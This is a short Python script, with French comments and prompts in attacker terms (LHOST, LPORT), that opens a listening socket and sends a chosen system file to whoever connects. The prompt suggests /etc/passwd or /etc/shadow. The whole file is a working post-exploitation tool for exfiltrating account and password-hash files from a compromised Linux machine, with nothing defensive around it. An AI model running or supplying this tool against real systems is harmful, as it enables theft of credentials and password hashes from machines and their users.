import socket

Host = input("\033[0;32m[*]Re-type LHOST:")
Port = int(input("\033[0;32m[*]Re-type LPORT:"))
Path = input("\033[0;35m[/etc/passwd] or [/etc/shadow]:")

# Créer un socket pour le serveur
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Lier l'adresse et le port
server.bind((Host, Port))

# Mettre le serveur en mode écoute
server.listen()
print(f"Server listening now on port [{Port}]...")

# Accepter la connexion entrante du client
client_server, address_client = server.accept()
print(f"Connection from {address_client}")

try:
    # Lire et envoyer le fichier /etc/passwd par morceaux
    with open(f'{Path}', 'rb') as file:
        chunk = file.read(1024)  # Lire le fichier par morceaux de 1024 octets
        while chunk:
            client_server.sendall(chunk)
            chunk = file.read(1024)  # Lire le morceau suivant
finally:
    # Fermer la connexion avec le client
    client_server.close()
    print("Client connection closed.")

# Fermer le serveur
server.close()
print("Server closed.")

